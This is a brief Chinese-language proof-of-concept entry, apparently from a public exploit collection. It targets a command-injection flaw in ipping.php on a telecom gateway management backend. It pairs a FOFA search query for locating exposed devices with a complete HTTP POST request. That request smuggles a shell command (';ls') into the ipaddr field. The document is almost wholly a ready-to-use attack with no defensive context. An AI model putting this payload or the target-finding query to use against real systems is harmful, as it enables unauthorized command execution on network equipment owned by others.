## 电信网关配置管理后台ipping.php存在命令执行漏洞

## fofa
```
body="img/login_bg3.png" && body="系统登录"
```

## poc
```
POST /manager/ipping.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Connection: close
Cookie: PHPSESSID=pof41mogacm6v38ltsni5t6962
Upgrade-Insecure-Requests: 1

ipaddr=127.0.0.1;ls
```
![image](https://github.com/wy876/POC/assets/139549762/5c08273c-6607-4c66-a7f6-638c448aa4cb)
